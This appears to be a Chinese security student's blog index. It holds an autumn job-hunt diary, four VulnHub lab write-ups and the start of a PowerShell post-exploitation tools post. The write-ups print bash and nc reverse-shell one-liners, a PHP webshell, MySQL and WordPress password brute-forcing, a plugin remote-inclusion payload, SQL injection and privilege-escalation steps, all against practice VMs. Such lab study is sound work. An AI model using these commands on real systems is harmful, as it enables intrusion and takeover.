<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>秋招总结</title>
    <url>/2020/10/19/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="秋招总结"><a href="#秋招总结" class="headerlink" title="秋招总结"></a>秋招总结</h1><p>距离上次更新博客过了好久，最近一直忙着秋招，直到今天才算是结束秋招，这段时间是真的忙，收获也特别大，特此开一个博客记录下来。</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>开始准备秋招的时候，也很迷茫，不知道自己投什么岗位，想去做安研，又觉得自己太菜，做渗透安服，感觉自己好久没学渗透，都忘得差不多了，所以刚开始就复习了一波，但是后面实际面试笔试也没有想想中的难。</p>
<p><img src="https://s1.ax1x.com/2020/10/19/0z93AP.jpg" alt="0z93AP.jpg"></p>
<p>截至今天我投递的：</p>
<blockquote>
<p>度小满（笔试）（20号8点）（笔试题目奇葩）（没了）<br>安恒（已投简历）（没了）<br>深信服（笔试结束）（准备一面）（二面没预约上，等待下一批）（二面混混）(三面线下直接给offer)<br>绿盟（直接面试）（一面准备）（一面二面一起，节后等消息）（陈珂面）（发了offer）<br>中孚信息（HR初筛）（没了）<br>微步在线（网申）（笔试好难）（面试凉了）（二面准备）（三面还行）（hr面愉快）（补面准备）(等待hr消息)（10月1号给通过通知）（10月16号前给offer）<br>六方云安全（网申）（一面）（hr面）五个工作日（没了）<br>哈罗出行（内推）（笔试不想做）</p>
</blockquote>
<p>投的公司也不多，差不多海投，没有针对性的去做，自己目标也是安全乙方</p>
<h2 id="绿盟"><a href="#绿盟" class="headerlink" title="绿盟"></a>绿盟</h2><p>​    对于绿盟，自己投递的是西安这边的安服岗位，投递和面试时间隔了有段时间，我还以为自己凉了，是直接去了线下去面试，一面二面一起面试了，感觉还不错，无论是对面试的感觉还是对面试官的感觉，聊起来还可以，主要是针对于自己简历上的实习经历说了很多，还有一些渗透的东西，自己大概答上了七八成吧，后面过了国庆（自己也是心大，出去玩了好几天），后面要让绿盟副总裁陈珂三面，聊了10分钟左右，也还行，当时就觉得差不多稳了，期望薪资自己报了西安15w，差不多是西安安服岗位白菜价，过了一段时间给了offer，给的薪资高过了期望薪资，也不知道是不是sp，整体来说绿盟对我的感觉是十分不错的，对于我来说是值得深思的选择。</p>
<p><img src="https://s1.ax1x.com/2020/10/19/0zFwxU.png" alt="0zFwxU.png"></p>
<h2 id="深信服"><a href="#深信服" class="headerlink" title="深信服"></a>深信服</h2><p>​    深信服是我比较早投递的，投递的岗位也是安服岗位，感觉深信服投递人好多，笔试不太难，认真做都能过，一面聊了20分钟，技术上问了一些，主要还是问了问我的实习经历，二面差不多，问问实习经历和一些生活问题，印象最大的是一面二面，包括后面的hr面试都问了加班问题，说实在我对适量加班没有啥问题，但是我了解到的深信服加班，确实有些。。我是希望在工作之余是有自己一定生活时间的，hr面试是线下面试，当时是自己已经拿到offer而且已经决定去了，但是还是好奇深信服会给我开多少，我给他报的薪资是20w以上，面试官当时用计算器给我算了下，当时把我整蒙了，最后给我说差不多达到我的期望薪资了，hr面试还聊的不错，还对我做了性格测试，一边面试一边记录，估计是要对我评测以便入职后好给我leader我的资料。总体来说深信服对我而言我不是很想去，因为城市是未知的还有一些其他原因。</p>
<p><img src="https://s1.ax1x.com/2020/10/19/0znG4J.png" alt="0znG4J.png"></p>
<h2 id="六方云安全"><a href="#六方云安全" class="headerlink" title="六方云安全"></a>六方云安全</h2><p>​    唉，很迷，当时是跟着同学投递的，投完是在国庆节当天网上面试（。。。），后面二面也是聊了聊（给我画了很多饼，还让我了解了下公司，之前也没听过），面完感觉基本稳了，hr说五个工作日给我消息，最后没给。。。。</p>
<p><img src="https://s1.ax1x.com/2020/10/19/0znrUe.jpg" alt="0znrUe.jpg"></p>
<h2 id="微步在线"><a href="#微步在线" class="headerlink" title="微步在线"></a>微步在线</h2><p>​    这家是我最想去的公司，公司虽然是个创业公司，但是前景和目前做出来的产品是国内TOP1级别的，威胁情报在国内起步比较晚，甚至这个方向在业界也是新技术，但是很有挑战性，是我喜欢做的事情，但是当时面试也算不上一帆风顺：</p>
<blockquote>
<p>  本来投微步就是为了试试，也不敢投安研，投了安服，笔试一面通过后，二面我的是安服主管，聊的还可以，到了三面就和一个30岁大叔聊，聊的也是我实习经历，没问我渗透安服那边的事情，最后还让我选择是否转到安研岗位，我同意了，四面是hr面，让我了解到了公司福利制度，就等着最后offer了，结果晚上给我说明天加了一面，是安研的主管，头痛，五面聊的时候感觉我心态就有点问题了，但是还是聊了下来，发现他说的东西比我还多，对方很有耐心，最后让等hr通知，现在第二天了，我还在等，心慌慌，我觉得一面面下来，本来我的试试心态逐渐变得渴望，但是我每次渴望的东西好像都不会成功，心态放平吧。</p>
</blockquote>
<p>这是当时五面完后的心路历程，整体来说面试是我感觉最难的，尤其一面是面了这么多公司中一面最难的，问题很广泛，我能说的上来的不多，但是幸好我的实习经历捞了我一手，实习做的这方面，对我的面试确实很有帮助。最后收到offer确实很开心，我不会后悔我的选择，也希望我的选择没问题。</p>
<p><img src="https://s1.ax1x.com/2020/10/19/0zu3sP.png" alt="0zu3sP.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我的秋招结束了，虽然没去阿里，腾讯，字节，美团，百度，华为等这些巨头公司，但是也收到安全圈里面知名乙方的offer，算下来大概4个offer（还有个实习公司口头的转正offer），最后也选择了我最想去的一家公司，希望未来自己能乘风起航吧。能做自己想做的事情，能去自己想去的地方，给自己的未来创造更多种可能。</p>
<p><img src="https://s1.ax1x.com/2020/10/19/0zMMut.png" alt="0zMMut.png"></p>
]]></content>
      <categories>
        <category>个人介绍</category>
      </categories>
      <tags>
        <tag>个人介绍</tag>
        <tag>BMooS</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub靶机writeup--midnight</title>
    <url>/2020/09/10/VulnHub%E9%9D%B6%E6%9C%BAwriteup-midnight/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>再来一个靶机，做完这个最近换点东西写，感觉这些靶机做多了也是套路，之后做的整点难度高点的，比如这个靶机难度比之前高点，学的东西也多一点。</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>上来老传统，收集一波信息</p>
<blockquote>
<p>kali：192.168.1.185</p>
<p>靶机：192.168.1.242</p>
<p>靶机开放22，80，3306端口</p>
</blockquote>
<p>打开web页面，url变为<code>http://sunset-midnight/</code>，路径<code>/etc/hosts</code>修改下host信息，再次打开web页面，发现是<code>wordpress</code>搭建的，用<code>wpscan</code>扫一下</p>
<p><code>wpscan --url http://sunset-midnight/ -e</code></p>
<p>没有值得关注的部分，发现一个用户名<code>admin</code>，<code>wpscan</code>尝试爆破一下</p>
<p><code>wpscan --url http://sunset-midnight/ -U admin -P /usr/share/wordlists/rockyou.txt</code></p>
<p>在爆破的同时查看下其他突破点，靶机开放3306mysql端口，用<code>hydra</code>爆破下<code>root</code>用户密码</p>
<p><code>hydra 192.168.1.242 mysql -l root -P /usr/share/wordlists/rockyou.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/09/10/wYwJqs.png" alt="wYwJqs.png"></p>
<p>爆破出来密码为<code>robert</code> ，连接一波</p>
<p><code>mysql -u root -p -h sunset-midnight</code></p>
<p><img src="https://s1.ax1x.com/2020/09/10/wYwWi6.png" alt="wYwWi6.png"></p>
<p>在<code>wordpress_db</code>数据库中的<code>wp_users</code>表中看到admin用户密码</p>
<p><img src="https://s1.ax1x.com/2020/09/10/wY0AYV.png" alt="wY0AYV.png"></p>
<p>这里密码难以破解，可以update更新一个新的密码MD5覆盖掉原来密码</p>
<p><img src="https://s1.ax1x.com/2020/09/10/wY0IhV.png" alt="wY0IhV.png"></p>
<p>这个时候就可以登陆wordpress了，可以通过Plugins中的Plugin Editor中编辑插件，加入一个反弹shell，这里选择Hello Dolly，在代码前加入<code>system(&quot;/bin/bash -c &#39;bash -i &amp;&gt; /dev/tcp/192.168.1.185/9527 0&gt;&amp;1&#39;&quot;);</code></p>
<p><img src="https://s1.ax1x.com/2020/09/10/wYDQG6.png" alt="wYDQG6.png"></p>
<p>选择Update File，在本地设置好监听，然后在Installed Plugins中将Hello Dolly点击Activate</p>
<p><img src="https://s1.ax1x.com/2020/09/10/wYr8f0.png" alt="wYr8f0.png"></p>
<p>成功反弹出一个www-data的shell，在shell中寻找有用信息时，在网站根目录下的wordpress目录看到wp-config.php，在其中看到一个账户密码</p>
<p><img src="https://s1.ax1x.com/2020/09/10/wYy2od.png" alt="wYy2od.png"></p>
<p>正好在/home/路径下也看到靶机上有个jose用户，尝试是否用密码复用，ssh连接一下</p>
<p><img src="https://s1.ax1x.com/2020/09/10/wYyXYn.png" alt="wYyXYn.png"></p>
<p>成功连上，获取到了jose权限</p>
<p>这个时候，靶机已经做到最后一步——提权到root用户，这个靶机用到了SUID提权的方式，这个之前没有学习过，趁此机会<a href="http://notes.getshell.net/Notes/131.html" target="_blank" rel="noopener">学习</a>了一波</p>
<p><img src="https://s1.ax1x.com/2020/09/11/wYcKg0.png" alt="wYcKg0.png"></p>
<p>找一下具有SUID权限的文件，这个看到这个<code>/usr/bin/status</code>这个文件有点问题，拉下来反汇编看下</p>
<p><img src="https://s1.ax1x.com/2020/09/11/wYOCng.png" alt="wYOCng.png"></p>
<p>了解到了<code>/usr/bin/status</code>这个文件的内容，接下来利用其获取到root权限</p>
<p>首先在<code>/tmp</code>目录下创建一个service文件，写入bash</p>
<p><code>echo &quot;/bin/bash&quot; &gt; /tmp/service</code></p>
<p>然后给与service文件执行权限</p>
<p><code>chmod u+x /tmp/service</code></p>
<p>设置环境变量加入<code>/tmp/</code>目录</p>
<p><code>export PATH=/tmp:$PATH</code></p>
<p>然后执行<code>/bin/status</code></p>
<p><img src="https://s1.ax1x.com/2020/09/11/wYgkxx.png" alt="wYgkxx.png"></p>
<p>成功获取到了root权限，取得flag</p>
<p><img src="https://s1.ax1x.com/2020/09/11/wYgmZD.png" alt="wYgmZD.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶机整体难度比之前高一点，练习这个靶机也学习到了很多，在web没有突破口的时候，尝试爆破3306端口，取得了root权限的数据库，同时覆盖掉wordpress的用户密码，进入了web端的后台管理界面，因为是admin用户，就可以对插件代码进行修改，加入了反弹shell，本地就获取到靶机的低权限shell，对网站配置文件的查看获取到一个靶机用户shell，然后用SUID提权到root。靶机整体思路比较明晰，也验证了安全是整体的，只要有一个点不安全就能突破防线。</p>
]]></content>
      <categories>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>渗透实战</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub靶机writeup--FunBox</title>
    <url>/2020/09/07/VulnHub%E9%9D%B6%E6%9C%BAwriteup-FunBox/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于开学了，但是开学后也没有期待的那么有意思，不过大四课变少了，现在得习惯在学校和在家的学习状态方式的区别，今天下午做个之前在家下载的靶机。</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>靶机用的VirtualBox打开，和上一篇配置操作差不多</p>
<blockquote>
<p>kali：192.168.1.185</p>
<p>靶机：192.168.1.130</p>
</blockquote>
<p>靶机开启21，22，80端口，不懂这个ftp怎么用，没用上</p>
<p>浏览器打开192.168.1.130，url变为<code>http://funbox.fritz.box/</code>，打不开，需要修改kali的host文件，在kali路径<code>/etc/hosts</code></p>
<p><img src="https://s1.ax1x.com/2020/09/08/wKbebD.png" alt="wKbebD.png"></p>
<p>再次打开网页就能显示了，网页明显是wordpress搭建，尝试用wpscan扫描</p>
<p><code>wpscan --url http://funbox.fritz.box/ -e</code></p>
<p>没有发现有漏洞的插件，枚举出来两个用户</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wKO3x1.png" alt="wKO3x1.png"></p>
<p>尝试爆破下</p>
<p><code>wpscan --url http://funbox.fritz.box/ -U admin -P /usr/share/wordlists/rockyou.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/09/08/wKXFoD.png" alt="wKXFoD.png"></p>
<p><code>wpscan --url http://funbox.fritz.box/ -U joe -P /usr/share/wordlists/rockyou.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/09/08/wKX5kD.png" alt="wKX5kD.png"></p>
<p>账号登陆上去，在网页上没有发现利用的点</p>
<p>尝试密码复用登陆SSH <code>ssh joe@192.168.1.130</code></p>
<p>成功登陆到<code>joe</code>账户</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wKx5kT.png" alt="wKx5kT.png"></p>
<p>发现是一个受限的shell，用<code>bash -i</code>绕过（绕过方式有很多）</p>
<p>根据在<code>joe</code>目录下的<code>mbox</code>中信息提示来到<code>/home/funny</code>下</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wMFvfP.png" alt="wMFvfP.png"></p>
<p>根据这个不难猜到管理员会定时运行<code>.backup.sh</code></p>
<p><img src="https://s1.ax1x.com/2020/09/08/wMkAkn.png" alt="wMkAkn.png"></p>
<p><code>.backup.sh</code>是用于备份网站文件，但是joe用户可以进行修改，将其修改成一个反弹shell</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wMkINn.png" alt="wMkINn.png"></p>
<p>在本地用nc监听端口，等待反弹shell的连接（这里应该root用户有一个定时任务，定时运行这个sh脚本，当root用户运行我们修改后的sh脚本，就会反弹出一个root权限的shell）（注意：不止root用户会定时运行这个，funny用户也会定时运行这个sh脚本，当funny用户运行这个sh脚本时候，会反弹一个funny的shell，本地断开重新监听即可）</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wMEnZ4.png" alt="wMEnZ4.png"></p>
<p>获取到flag</p>
<p><img src="https://s1.ax1x.com/2020/09/08/wMErSP.png" alt="wMErSP.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶机总体上来说比较简单，最近玩的靶机难度都不是很高，但是也能学点东西，至少大概思路是有了，看了下，还剩下一个靶机没做，等做完那个，找点难度高的。</p>
]]></content>
      <categories>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>渗透实战</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub靶机writeup--So Simple 1</title>
    <url>/2020/09/02/VulnHub%E9%9D%B6%E6%9C%BAwriteup-So-Simple-1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>发现前两天下了个靶机还没做，今天就做一下，马上要开学了，有点期待。</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>下载靶机<code>So Simple 1</code>到本地，本来是用VMware打开的，但是发现有点问题，就用VirtualBox了，值得注意的一点是VirtualBox要用管理员权限打开，这里我被坑了好久，还有一点就是VirtualBox没有扩展下载的话就把靶机的USB设备调到1.1(OHCI)，要不打不开。</p>
<p>这里网络设置是，kali我是用VMware打开，靶机用的VirtualBox，网络设置都设置为桥接模式，和物理机同在一个网段。</p>
<blockquote>
<p>kali：192.168.0.105</p>
<p>靶机：192.168.0.100</p>
</blockquote>
<p>靶机端口扫描结果开启了22和80端口</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><code>dirb</code>扫描结果没啥特殊的，唯一值得关注的是靶机有wordpress，在路径<code>http://192.168.0.100/wordpress/</code>目录下，这里用<code>wpscan</code>扫描：</p>
<p><code>wpscan --url http://192.168.0.100/wordpress</code></p>
<p><img src="https://s1.ax1x.com/2020/09/02/wp6Yb8.png" alt="wp6Yb8.png"></p>
<p>发现插件<code>social-warfare</code>版本有些低，网上查一查，果真查到了<a href="https://wpvulndb.com/vulnerabilities/9259" target="_blank" rel="noopener">RCE漏洞</a></p>
<p><img src="https://s1.ax1x.com/2020/09/02/wp6Dvq.png" alt="wp6Dvq.png"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过给的POC验证一下：</p>
<p>首先在本地写好payload，用python搭建一个HTTP服务：</p>
<p><img src="https://s1.ax1x.com/2020/09/02/wphUOA.png" alt="wphUOA.png"></p>
<p>然后查看<code>http://192.168.0.100/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://192.168.0.105:8000/payload.txt</code></p>
<p><img src="https://s1.ax1x.com/2020/09/02/wp4QXj.png" alt="wp4QXj.png"></p>
<p>POC验证成功</p>
<p>然后通过RCE来反弹一个shell，先写一个反弹shell，然后在本地监听</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9CKoV.png" alt="w9CKoV.png"></p>
<p>这里的payload为：</p>
<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.105 9527 &gt;/tmp/f</code></p>
<p>解释一下，这里先用mkfifo建立了一个管道，然后使用cat将管道里面的内容输出传递给/bin/bash，bash会执行管道里面的命令并将标准输出和标准错误通过nc传递给远程主机，管道的标准输入也重定向到nc远程主机的输出上，形成了一个回路</p>
<h2 id="用户权限获取"><a href="#用户权限获取" class="headerlink" title="用户权限获取"></a>用户权限获取</h2><p>根据提示，这个靶机有三个flag，两个用户和一个root，那么就要获取到这三个权限来查看flag，先从用户看：</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9PFTx.png" alt="w9PFTx.png"></p>
<p>两个用户，一个max一个steven</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9Pc3F.png" alt="w9Pc3F.png"></p>
<p>max用户的ssh私钥设置不当，www-data用户可以使用cat查看到，将ssh私钥复制到本地，通过ssh连接到靶机，获取到max用户权限（要设置文件权限才可以使用）</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9kXDJ.png" alt="w9kXDJ.png"></p>
<p>max的flag</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9A8bj.png" alt="w9A8bj.png"></p>
<p>使用<code>sudo -l</code>发现steven用户可以免密使用service服务，使用service切换到steven用户的bash</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9Aqit.png" alt="w9Aqit.png"></p>
<p>获取到steven的flag</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9ElJx.png" alt="w9ElJx.png"></p>
<h2 id="root权限获取"><a href="#root权限获取" class="headerlink" title="root权限获取"></a>root权限获取</h2><p>同样的通过<code>sudo -l</code>看到可以使用root权限免密运行<code>/opt/tools/server-health.sh</code>，但是tools文件夹并不存在</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9nzLT.png" alt="w9nzLT.png"></p>
<p>可以自己创建该文件，写入一个反弹shell</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9Q0te.png" alt="w9Q0te.png"></p>
<p>在本地进行监听，成功获取root用户的flag</p>
<p><img src="https://s1.ax1x.com/2020/09/02/w9lAAO.png" alt="w9lAAO.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次的靶机也很简单，但是实际上来说，黑灯瞎火去找，或许会没有思路，只能说这次靶机的思路很骚，或许是我少见多怪，其中也学习到了很多东西，包括wordpress插件的RCE漏洞利用，使用ssh私钥登陆远程主机，sudo设置中免密配置不当可以造成越权，反弹shell的原理以及使用。</p>
]]></content>
      <categories>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>渗透实战</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub靶机writeup--Billu_b0x</title>
    <url>/2020/08/28/VulnHub%E9%9D%B6%E6%9C%BAwriteup-Billu-b0x/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近闲来无事，觉得自己学习理论知识太多，实验做的比较少，就在VulnHub上下载靶机来做一做，感觉VulnHub上有些靶机挺有意思的，取得root的方式也不唯一，这篇博客是VulnHub系列的第一篇writeup，之后也会把自己做的wp分享上来。</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>下载靶机Billu_b0x到本地，用VMware打开，设置网络为NAT，和kali同属于一个网段。</p>
<h2 id="进行主机扫描和端口扫描"><a href="#进行主机扫描和端口扫描" class="headerlink" title="进行主机扫描和端口扫描"></a>进行主机扫描和端口扫描</h2><p><img src="https://s1.ax1x.com/2020/08/29/d7tGwR.png" alt="d7tGwR.png"></p>
<p>发现靶机开启了http服务，用dirb进行目录扫描</p>
<p><code>dirb http://192.168.2.133 /usr/share/dirb/wordlists/big.txt</code></p>
<p>根据扫描结果可以看到网站还有phpmyadmin服务，同时扫描根目录下文件有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;add</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;c</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;head </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;in</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;index</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;panel</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;show</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.2.133&#x2F;test</span><br></pre></td></tr></table></figure>

<h2 id="查看网站突破点"><a href="#查看网站突破点" class="headerlink" title="查看网站突破点"></a>查看网站突破点</h2><p>网站主页面：</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d7a06U.png" alt="d7a06U.png"></p>
<p>主页面需要登陆，尝试爆破和万能密钥没用，看其他页面</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d708mD.png" alt="d708mD.png"></p>
<p>上传文件没用，猜测是个静态页面，迷惑用的</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d70tkd.png" alt="d70tkd.png"></p>
<p>phpinfo信息</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d702hn.png" alt="d702hn.png"></p>
<p>这里提示file参数为空，尝试get提交无用，post提交：</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d7BA3t.png" alt="d7BA3t.png"></p>
<p>通过此处将网站上的已经扫出来的文件下载，进行代码审计</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d7DVi9.png" alt="d7DVi9.png"></p>
<p>在c.php文件中可以看到数据库的账号密码，通过前端phpmyadmin登陆</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d7DTY9.png" alt="d7DTY9.png"></p>
<p>在数据库ica_lab下的auth表中发现网站主页登陆的用户名密码</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d7s38A.png" alt="d7s38A.png"></p>
<p>这里发现可以通过phpmyadmin执行SQL语句，并且可以通过phpinfo知道网站绝对路径，想通过SQL写入webshell，但是发现权限不够</p>
<p><img src="https://s1.ax1x.com/2020/08/29/d7x8RH.png" alt="d7x8RH.png"></p>
<h2 id="上传图片马取得webshell"><a href="#上传图片马取得webshell" class="headerlink" title="上传图片马取得webshell"></a>上传图片马取得webshell</h2><p>换一种思路，通过刚才得到的用户名密码登陆网站主页：</p>
<p><img src="https://s1.ax1x.com/2020/08/29/dHEOiR.png" alt="dHEOiR.png"></p>
<p>在主页发现文件上传点，是用来上传用户图像的，之前爆目录的时候知道这里的路径为<code>网站根目录/uploaded_images/图片文件</code></p>
<p><img src="https://s1.ax1x.com/2020/08/29/dHfFMQ.png" alt="dHfFMQ.png"></p>
<p>这里可以制作一个图片马来上传：</p>
<ol>
<li><p>写好php代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'cmd'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>利用cmd来制作图片马</p>
<p> <img src="https://s1.ax1x.com/2020/08/30/dbFafx.png" alt="dbFafx.png"></p>
</li>
</ol>
<p>将图片马上传</p>
<p><img src="https://s1.ax1x.com/2020/08/30/dbFong.png" alt="dbFong.png"></p>
<p>图片马上传了，还需要文件包含漏洞得把这个图片让后端当成php来解析，之前在代码审计的时候，发现在panel.php有文件包含漏洞：</p>
<p><img src="https://s1.ax1x.com/2020/08/30/dbkPE9.png" alt="dbkPE9.png"></p>
<p>测试一下——不成功，没反应</p>
<p>猜测是因为图片太大，php代码加在图片末尾，没加载出来。</p>
<blockquote>
<p>太坑了，在网上找了好久，终于找到一个图片大小比较小的，测试成功</p>
</blockquote>
<p><img src="https://s1.ax1x.com/2020/08/30/dbJK4P.png" alt="dbJK4P.png"></p>
<p>可以看到这里的权限是<code>www-data</code></p>
<h2 id="反弹一个低权限shell"><a href="#反弹一个低权限shell" class="headerlink" title="反弹一个低权限shell"></a>反弹一个低权限shell</h2><p>构建一个shell反弹出来：</p>
<p><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.2.132/4444 0&gt;&amp;1&quot; | bash</code></p>
<p>这里要进行url编码：</p>
<p><code>echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.132%2F4444%200%3E%261%22%20%7C%20bash</code></p>
<p><img src="https://s1.ax1x.com/2020/08/30/dbjshD.png" alt="dbjshD.png"></p>
<p>然后在终端中用nc监听</p>
<p><img src="https://s1.ax1x.com/2020/08/30/dbj2jA.png" alt="dbj2jA.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>拿到shell之后，要进行提权到root权限，使用<code>uname -a</code>和<code>cat /etc/issue</code>来查看系统内核版本，考虑使用本地溢出漏洞来进行提权</p>
<p><img src="https://s1.ax1x.com/2020/08/30/dbvAD1.png" alt="dbvAD1.png"></p>
<p>下载exp：<a href="https://www.exploit-db.com/exploits/37292" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/37292</a></p>
<p>注意的是网站根目录没有写权限，但是在<code>/uploaded_images/</code>是一个写权限目录</p>
<p>为了上传文件方便，这里再写一个webshell用菜刀连上</p>
<p><img src="https://s1.ax1x.com/2020/08/30/dbzDA0.png" alt="dbzDA0.png"></p>
<p>直接把exp拖进去就可以了，然后编译执行，提权到root</p>
<p><img src="https://s1.ax1x.com/2020/08/30/dqSS4f.png" alt="dqSS4f.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机总体来说比较简单，但是渗透的时候也遇到了一些坑，增长了很多经验，值得初学者学习学习。</p>
<h2 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h2><p>另外两种突破点：</p>
<ol>
<li><p>在test.php文件任意下载漏洞中，可以通过phpmyadmin的配置文件获取root密码，需要猜路径，根据爆破出的目录，该配置文件所在路径为：<code>/var/www/phpmy/config.inc.php</code></p>
<p> <img src="https://s1.ax1x.com/2020/08/30/dqCfxO.png" alt="dqCfxO.png"></p>
<p> 打开文件，可以看到root的密码是<code>roottoor</code>，直接ssh连接即可</p>
<p> <img src="https://s1.ax1x.com/2020/08/30/dqCTZd.png" alt="dqCTZd.png"></p>
</li>
<li><p>根据代码审计，在对首页登陆index.php的尝试SQL注入绕过</p>
<p> <img src="https://s1.ax1x.com/2020/08/30/dqPsl8.png" alt="dqPsl8.png"></p>
<p> 则payload为<code>&#39;or 1=1 --\&#39;</code>（这里不太明白，或许就是or把pass和uname弄没了，导致where 1，最后查出数据库结果？）</p>
<p> <img src="https://s1.ax1x.com/2020/08/30/dqiGhq.png" alt="dqiGhq.png"></p>
<p> SQL注入绕过成功</p>
</li>
</ol>
]]></content>
      <categories>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>渗透实战</tag>
      </tags>
  </entry>
  <entry>
    <title>powershell后渗透阶段---工具篇</title>
    <url>/2020/08/18/powershell%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近闭关修炼了一段时间，主要学习渗透测试，恶意代码分析先暂停下，学习这些东西我都有兴趣，多学些多见识见识，增加一下自己对安全的理解。</p>
<p>在学习渗透测试的时候，重新温习了metasploit，觉得这个漏洞利用框架真厉害，最近也买了很多书，等看完（感觉得花很长时间，flag先立起来）的时候，再更新一篇博客（估计得很长时间之后了）来写这些书的观后体验（已经看完两本了，还有五本），有些书确实有些老了（目前看的书一本是15年，一本是18年的），但是核心知识不会变。</p>
<p>最近学习到了后渗透阶段攻击，是对windows平台使用powershell来进行的，这份技术在17-18年挺火的（最近也不差），也有很多工具在那时候被开发出来，例如powersploit，empire，powerup，nishang等工具，之所以流行，关键因素还是powershell的强大，和powershell在主流windows操作系统上默认安装以及当时powershell免杀，目前随着技术的发展，powershell已经可以被主流杀软检测，但是powershell的混淆技术也十分高超，目前来说利用powershell也是非常不错的。</p>
<p>这篇博客主要用来记录学习本人在使用powershell技术过程中的三大工具powersploit，empire，nishang，这篇博客有可能比较长，因为我想做的详细点，尽量设置好章节，以便我之后进行查阅。（注意：阅读本文章需要一定的powershell基础）</p>
<a id="more"></a>

<h1 id="powersploit"><a href="#powersploit" class="headerlink" title="powersploit"></a>powersploit</h1><p>powersploit是一款基于powershell的后渗透框架软件，包含很多powershell脚本来实现渗透测试中的：信息收集，权限提升，权限维持，其github项目地址为<code>https://github.com/PowerShellMafia/PowerSploit</code>（无语中，今天进去看，发现README.md更新了一行<strong>This project is no longer supported</strong>，过时技术，算了，主要学个思路，看个源码）</p>
